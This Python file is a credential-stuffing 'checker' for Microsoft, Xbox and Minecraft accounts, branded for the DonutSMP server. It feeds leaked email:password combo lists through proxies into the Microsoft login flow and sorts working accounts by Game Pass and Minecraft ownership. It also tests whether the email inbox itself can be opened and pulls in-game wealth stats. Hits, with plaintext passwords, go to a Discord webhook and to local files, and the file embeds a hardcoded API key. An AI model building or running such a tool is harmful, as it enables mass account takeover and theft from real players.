import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from colorama import Fore, Style, init
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Constants
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
DONUTSMP_API_KEY = "baf466a88b9f477fb3249b777ae0478d"

# Global variables
Combos = []
proxylist = []
fname = ""
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

# Premium ASCII Logo
logo = Fore.MAGENTA + '''
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗                     ║
║    ████╗  ██║██╔═══██╗██║   ██║██╔══██╗                    ║
║    ██╔██╗ ██║██║   ██║██║   ██║███████║                    ║
║    ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║                    ║
║    ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║                    ║
║    ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝                    ║
║                                                              ║
║                    🍩 DONUTSMP CHECKER 🍩                    ║
║                      ULTIMATE EDITION                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
''' + Style.RESET_ALL

class Config:
    def __init__(self):
        self.data = {}
    
    def set(self, key, value):
        self.data[key] = value
    
    def get(self, key, default=None):
        return self.data.get(key, default)

config = Config()

# Helper functions for formatting numbers and time
def format_number(num):
    try:
        num = int(num)
        if num >= 1000000000:  # Billion
            return f"{num/1000000000:.1f}B"
        elif num >= 1000000:  # Million
            return f"{num/1000000:.1f}M"
        elif num >= 1000:  # Thousand
            return f"{num/1000:.1f}K"
        else:
            return str(num)
    except (ValueError, TypeError):
        return "N/A"

def format_time(seconds):
    try:
        seconds = int(seconds)
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"
    except (ValueError, TypeError):
        return "N/A"

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.donutsmp = None
        self.donutsmp_rank = None
        self.donutsmp_level = None
        self.donutsmp_balance = None
        self.donutsmp_playtime = None
        self.donutsmp_kills = None
        self.donutsmp_deaths = None
        self.donutsmp_blocks_broken = None
        self.donutsmp_blocks_placed = None
        self.donutsmp_shards = None
        self.donutsmp_base_found = None
        self.donutsmp_location = None
        self.donutsmp_mobs_killed = None
        self.donutsmp_money_spent = None
        self.donutsmp_money_made = None
        self.cape = None
        self.access = None
        self.namechanged = None
        self.lastchanged = None
        
    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.donutsmp != None: message+=f"\nDonutSMP: {self.donutsmp}"
        if self.donutsmp_rank != None: message+=f"\nDonutSMP Rank: {self.donutsmp_rank}"
        if self.donutsmp_level != None: message+=f"\nDonutSMP Level: {self.donutsmp_level}"
        if self.donutsmp_balance != None: message+=f"\nDonutSMP Balance: {self.donutsmp_balance}"
        if self.donutsmp_playtime != None: message+=f"\nDonutSMP Playtime: {self.donutsmp_playtime}"
        if self.donutsmp_kills != None: message+=f"\nDonutSMP Kills: {self.donutsmp_kills}"
        if self.donutsmp_deaths != None: message+=f"\nDonutSMP Deaths: {self.donutsmp_deaths}"
        if self.donutsmp_blocks_broken != None: message+=f"\nDonutSMP Blocks Broken: {self.donutsmp_blocks_broken}"
        if self.donutsmp_blocks_placed != None: message+=f"\nDonutSMP Blocks Placed: {self.donutsmp_blocks_placed}"
        if self.donutsmp_shards != None: message+=f"\nDonutSMP Shards: {self.donutsmp_shards}"
        if self.donutsmp_base_found != None: message+=f"\nDonutSMP Base Found: {self.donutsmp_base_found}"
        if self.donutsmp_location != None: message+=f"\nDonutSMP Location: {self.donutsmp_location}"
        if self.donutsmp_mobs_killed != None: message+=f"\nDonutSMP Mobs Killed: {self.donutsmp_mobs_killed}"
        if self.donutsmp_money_spent != None: message+=f"\nDonutSMP Money Spent: {self.donutsmp_money_spent}"
        if self.donutsmp_money_made != None: message+=f"\nDonutSMP Money Made: {self.donutsmp_money_made}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"
    
    def notify(self):
        global errors
        try:
            # Helper function to format values - display "N/A" for empty/None values
            def format_value(value):
                if value is None or value == "None" or value == "":
                    return "N/A"
                return value
            
            # Format all values
            email = format_value(self.email)
            password = format_value(self.password)
            name = format_value(self.name)
            account_type = format_value(self.type)
            donutsmp = format_value(self.donutsmp)
            rank = format_value(self.donutsmp_rank)
            level = format_value(self.donutsmp_level)
            balance = format_number(self.donutsmp_balance)
            playtime = format_value(self.donutsmp_playtime)
            kills = format_number(self.donutsmp_kills)
            deaths = format_number(self.donutsmp_deaths)
            blocks_broken = format_number(self.donutsmp_blocks_broken)
            blocks_placed = format_number(self.donutsmp_blocks_placed)
            shards = format_number(self.donutsmp_shards)
            base_found = format_value(self.donutsmp_base_found)
            location = format_value(self.donutsmp_location)
            mobs_killed = format_number(self.donutsmp_mobs_killed)
            money_spent = format_number(self.donutsmp_money_spent)
            money_made = format_number(self.donutsmp_money_made)
            optifine_cape = format_value(self.cape)
            mc_capes = format_value(self.capes)
            email_access = format_value(self.access)
            name_change = format_value(self.namechanged)
            last_changed = format_value(self.lastchanged)
            
            # Determine status color and emoji
            status_color = 3066993  # Green for online
            status_emoji = "🟢"
            if donutsmp == "Yes (Offline)":
                status_color = 15105570  # Yellow for offline
                status_emoji = "🟡"
            elif donutsmp == "No":
                status_color = 15158332  # Red for no account
                status_emoji = "🔴"
            elif donutsmp == "Error":
                status_color = 10181046  # Purple for error
                status_emoji = "🟣"
            
            # Create embed
            embed = {
                "title": f"{status_emoji} DonutSMP Account Found {status_emoji}",
                "description": f"**Premium Minecraft Account with DonutSMP Data**",
                "color": status_color,
                "thumbnail": {
                    "url": f"https://minotar.net/avatar/{name}/100"
                },
                "fields": [
                    {
                        "name": "🔐 Account Information",
                        "value": f"```\nEmail: {email}\nPassword: {password}\nUsername: {name}\nType: {account_type}```",
                        "inline": False
                    },
                    {
                        "name": "🍩 DonutSMP Status",
                        "value": f"**Status:** {donutsmp}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "🔥 Ultimate DonutSMP Checker 🔥",
                    "icon_url": "https://i.imgur.com/M4m2vjM.png"
                },
                "timestamp": datetime.now().isoformat()
            }
            
            # Add DonutSMP details if player has an account
            if donutsmp in ["Yes (Online)", "Yes (Offline)"]:
                # Add basic info
                basic_info = []
                if rank != "N/A": basic_info.append(f"**Rank:** {rank}")
                if location != "N/A": basic_info.append(f"**Location:** {location}")
                
                if basic_info:
                    embed["fields"].append({
                        "name": "📋 Basic Information",
                        "value": "\n".join(basic_info),
                        "inline": True
                    })
                
                # Add stats if available
                stats = []
                if balance != "N/A": stats.append(f"**Balance:** ${balance}")
                if playtime != "N/A": stats.append(f"**Playtime:** {playtime}")
                if kills != "N/A": stats.append(f"**Kills:** {kills}")
                if deaths != "N/A": stats.append(f"**Deaths:** {deaths}")
                
                if stats:
                    embed["fields"].append({
                        "name": "📊 Player Statistics",
                        "value": "\n".join(stats),
                        "inline": True
                    })
                
                # Add additional stats
                additional_stats = []
                if blocks_broken != "N/A": additional_stats.append(f"**Blocks Broken:** {blocks_broken}")
                if blocks_placed != "N/A": additional_stats.append(f"**Blocks Placed:** {blocks_placed}")
                if shards != "N/A": additional_stats.append(f"**Shards:** {shards}")
                if mobs_killed != "N/A": additional_stats.append(f"**Mobs Killed:** {mobs_killed}")
                
                if additional_stats:
                    embed["fields"].append({
                        "name": "🎮 Additional Stats",
                        "value": "\n".join(additional_stats),
                        "inline": True
                    })
                
                # Add economy stats
                economy_stats = []
                if money_spent != "N/A": economy_stats.append(f"**Money Spent:** ${money_spent}")
                if money_made != "N/A": economy_stats.append(f"**Money Made:** ${money_made}")
                
                if economy_stats:
                    embed["fields"].append({
                        "name": "💰 Economy Stats",
                        "value": "\n".join(economy_stats),
                        "inline": True
                    })
            
            # Add cosmetics field
            cosmetics = []
            if optifine_cape != "N/A": cosmetics.append(f"**Optifine Cape:** {optifine_cape}")
            if mc_capes != "N/A": cosmetics.append(f"**Minecraft Capes:** {mc_capes}")
            
            if cosmetics:
                embed["fields"].append({
                    "name": "👕 Cosmetics",
                    "value": "\n".join(cosmetics),
                    "inline": True
                })
            
            # Add account security field
            security = []
            if email_access != "N/A": security.append(f"**Email Access:** {email_access}")
            if name_change != "N/A": security.append(f"**Can Change Name:** {name_change}")
            if last_changed != "N/A": security.append(f"**Last Name Change:** {last_changed}")
            
            if security:
                embed["fields"].append({
                    "name": "🔒 Account Security",
                    "value": "\n".join(security),
                    "inline": True
                })
            
            # Create the payload without @everyone ping
            payload = {
                "content": f"🍩 **NEW DONUTSMP ACCOUNT HIT!** 🍩 ||`{email}:{password}`||",
                "embeds": [embed],
                "username": "🍩 DONUTSMP CHECKER 🍩",
                "avatar_url": "https://i.imgur.com/M4m2vjM.png"
            }
            
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
        except Exception as e:
            errors += 1
            print(f"{Fore.RED}Error sending Discord notification: {e}{Style.RESET_ALL}")
    
    def donutsmp_stats(self):
        global errors
        try:
            # Use the DonutSMP API with Bearer authentication
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'Authorization': f'Bearer {DONUTSMP_API_KEY}'
            }
            
            # Get player lookup info from DonutSMP API
            response = requests.get(f'https://api.donutsmp.net/v1/lookup/{self.name}', headers=headers, proxies=getproxy(), verify=False, timeout=10)
            
            if response.status_code == 200:
                lookup_data = response.json()
                
                # Check if player exists (status 200 means player exists and is online)
                if lookup_data.get('status') == 200 and lookup_data.get('result'):
                    self.donutsmp = "Yes (Online)"
                    player_info = lookup_data.get('result', {})
                    
                    # Extract available information from lookup data
                    if config.get('donutsmprank') is True:
                        self.donutsmp_rank = player_info.get('rank', 'N/A')
                    
                    if config.get('donutsmplocation') is True:
                        self.donutsmp_location = player_info.get('location', 'N/A')
                    
                    # Get player stats from DonutSMP API
                    stats_response = requests.get(f'https://api.donutsmp.net/v1/stats/{self.name}', headers=headers, proxies=getproxy(), verify=False, timeout=10)
                    
                    if stats_response.status_code == 200:
                        stats_data = stats_response.json()
                        
                        if stats_data.get('status') == 200 and stats_data.get('result'):
                            player_data = stats_data.get('result', {})
                            
                            # Extract stats from player data
                            if config.get('donutsmpbalance') is True:
                                self.donutsmp_balance = player_data.get('money', 'N/A')
                            
                            if config.get('donutsmpplaytime') is True:
                                self.donutsmp_playtime = format_time(player_data.get('playtime', 0))
                            
                            if config.get('donutsmpkills') is True:
                                self.donutsmp_kills = player_data.get('kills', 'N/A')
                            
                            if config.get('donutsmpdeaths') is True:
                                self.donutsmp_deaths = player_data.get('deaths', 'N/A')
                            
                            if config.get('donutsmpblocksbroken') is True:
                                self.donutsmp_blocks_broken = player_data.get('broken_blocks', 'N/A')
                            
                            if config.get('donutsmpblocksplaced') is True:
                                self.donutsmp_blocks_placed = player_data.get('placed_blocks', 'N/A')
                            
                            if config.get('donutsmpshards') is True:
                                self.donutsmp_shards = player_data.get('shards', 'N/A')
                            
                            if config.get('donutsmpmobs_killed') is True:
                                self.donutsmp_mobs_killed = player_data.get('mobs_killed', 'N/A')
                            
                            if config.get('donutsmpmoney_spent') is True:
                                self.donutsmp_money_spent = player_data.get('money_spent_on_shop', 'N/A')
                            
                            if config.get('donutsmpmoney_made') is True:
                                self.donutsmp_money_made = player_data.get('money_made_from_sell', 'N/A')
                            
                            if config.get('donutsmpbasefound') is True:
                                # Base found is not directly provided in the API response
                                self.donutsmp_base_found = "N/A"
                else:
                    self.donutsmp = "No"
            elif response.status_code == 500:
                # Player exists but is not online
                error_data = response.json()
                if error_data.get('message') == "This user is not currently online.":
                    self.donutsmp = "Yes (Offline)"
                    
                    # Try to get player stats even if they're offline
                    stats_response = requests.get(f'https://api.donutsmp.net/v1/stats/{self.name}', headers=headers, proxies=getproxy(), verify=False, timeout=10)
                    
                    if stats_response.status_code == 200:
                        stats_data = stats_response.json()
                        
                        if stats_data.get('status') == 200 and stats_data.get('result'):
                            player_data = stats_data.get('result', {})
                            
                            # Extract stats from player data
                            if config.get('donutsmpbalance') is True:
                                self.donutsmp_balance = player_data.get('money', 'N/A')
                            
                            if config.get('donutsmpplaytime') is True:
                                self.donutsmp_playtime = format_time(player_data.get('playtime', 0))
                            
                            if config.get('donutsmpkills') is True:
                                self.donutsmp_kills = player_data.get('kills', 'N/A')
                            
                            if config.get('donutsmpdeaths') is True:
                                self.donutsmp_deaths = player_data.get('deaths', 'N/A')
                            
                            if config.get('donutsmpblocksbroken') is True:
                                self.donutsmp_blocks_broken = player_data.get('broken_blocks', 'N/A')
                            
                            if config.get('donutsmpblocksplaced') is True:
                                self.donutsmp_blocks_placed = player_data.get('placed_blocks', 'N/A')
                            
                            if config.get('donutsmpshards') is True:
                                self.donutsmp_shards = player_data.get('shards', 'N/A')
                            
                            if config.get('donutsmpmobs_killed') is True:
                                self.donutsmp_mobs_killed = player_data.get('mobs_killed', 'N/A')
                            
                            if config.get('donutsmpmoney_spent') is True:
                                self.donutsmp_money_spent = player_data.get('money_spent_on_shop', 'N/A')
                            
                            if config.get('donutsmpmoney_made') is True:
                                self.donutsmp_money_made = player_data.get('money_made_from_sell', 'N/A')
                            
                            if config.get('donutsmpbasefound') is True:
                                # Base found is not directly provided in the API response
                                self.donutsmp_base_found = "N/A"
                else:
                    self.donutsmp = "Error"
                    print(f"{Fore.YELLOW}API Error: {response.status_code} - {response.text}{Style.RESET_ALL}")
            else:
                self.donutsmp = "Error"
                print(f"{Fore.YELLOW}API Error: {response.status_code} - {response.text}{Style.RESET_ALL}")
        except Exception as e:
            errors += 1
            self.donutsmp = "Error"
            print(f"{Fore.RED}Error checking DonutSMP stats: {e}{Style.RESET_ALL}")
    
    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False, timeout=5).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"
    
    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False, timeout=5).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False, timeout=5)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1
    
    def handle(self):
        global hits
        hits+=1
        if screen == "'2'": print(f"{Fore.GREEN}Hit: {self.name} | {self.email}:{self.password}{Style.RESET_ALL}")
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        if self.name != 'N/A':
            try: Capture.donutsmp_stats(self)
            except: pass
            try: Capture.optifine(self)
            except: pass
            try: Capture.full_access(self)
            except: pass
            try: Capture.namechange(self)
            except: pass
        open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
        Capture.notify(self)

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password

def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxy = getproxy()
        retries+=1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(f"{Fore.MAGENTA}2FA: {email}:{password}{Style.RESET_ALL}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(f"{Fore.RED}Bad: {email}:{password}{Style.RESET_ALL}")
                return "None", session
            else:
                session.proxy = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxy = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(f"{Fore.RED}Bad: {email}:{password}{Style.RESET_ALL}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(f"{Fore.LIGHTMAGENTA_EX}Valid Mail: {email}:{password}{Style.RESET_ALL}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=10)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def checkmc(session, email, password, token):
    global retries, cpm, checked, xgp, xgpu, other
    while True:
        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(f"{Fore.LIGHTGREEN_EX}Xbox Game Pass Ultimate: {email}:{password}{Style.RESET_ALL}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                    CAPTURE.handle()
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(f"{Fore.LIGHTGREEN_EX}Xbox Game Pass: {email}:{password}{Style.RESET_ALL}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(f"{Fore.YELLOW}Other: {email}:{password} | {items}{Style.RESET_ALL}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxy = getproxy()
            if len(proxylist) < 1: time.sleep(20)
            continue
        else:
            return False

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxy = getproxy()
                if len(proxylist) < 1: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(f"{Fore.RED}Bad: {email}:{password}{Style.RESET_ALL}")
    finally:
        session.close()

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(f"{Fore.LIGHTRED_EX}Invalid File.{Style.RESET_ALL}")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(f"{Fore.LIGHTBLUE_EX}[{str(len(lines) - len(Combos))}] Dupes Removed.{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}[{len(Combos)}] Combos Loaded.{Style.RESET_ALL}")
        except:
            print(f"{Fore.LIGHTRED_EX}Your file is probably harmed.{Style.RESET_ALL}")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(f"{Fore.LIGHTRED_EX}Invalid File.{Style.RESET_ALL}")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(f"{Fore.LIGHTBLUE_EX}Loaded [{len(proxylist)}] lines.{Style.RESET_ALL}")
            time.sleep(2)
        except Exception:
            print(f"{Fore.LIGHTRED_EX}Your file is probably harmed.{Style.RESET_ALL}")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"🍩 DONUTSMP CHECKER 🍩 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f"{Fore.CYAN} [{checked}\{len(Combos)}] Checked{Style.RESET_ALL}")
    print(f"{Fore.GREEN} [{hits}] Hits{Style.RESET_ALL}")
    print(f"{Fore.RED} [{bad}] Bad{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{sfa}] SFA{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA} [{mfa}] MFA{Style.RESET_ALL}")
    print(f"{Fore.LIGHTMAGENTA_EX} [{twofa}] 2FA{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX} [{xgp}] Xbox Game Pass{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX} [{xgpu}] Xbox Game Pass Ultimate{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{other}] Other{Style.RESET_ALL}")
    print(f"{Fore.LIGHTMAGENTA_EX} [{vm}] Valid Mail{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{retries}] Retries{Style.RESET_ALL}")
    print(f"{Fore.RED} [{errors}] Errors{Style.RESET_ALL}")
    utils.set_title(f"🍩 DONUTSMP CHECKER 🍩 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print()
    print(f"{Fore.LIGHTGREEN_EX}Finished Checking!{Style.RESET_ALL}")
    print()
    print(f"{Fore.GREEN}Hits: {Style.RESET_ALL}" + str(hits))
    print(f"{Fore.RED}Bad: {Style.RESET_ALL}" + str(bad))
    print(f"{Fore.YELLOW}SFA: {Style.RESET_ALL}" + str(sfa))
    print(f"{Fore.MAGENTA}MFA: {Style.RESET_ALL}" + str(mfa))
    print(f"{Fore.LIGHTMAGENTA_EX}2FA: {Style.RESET_ALL}" + str(twofa))
    print(f"{Fore.LIGHTGREEN_EX}Xbox Game Pass: {Style.RESET_ALL}" + str(xgp))
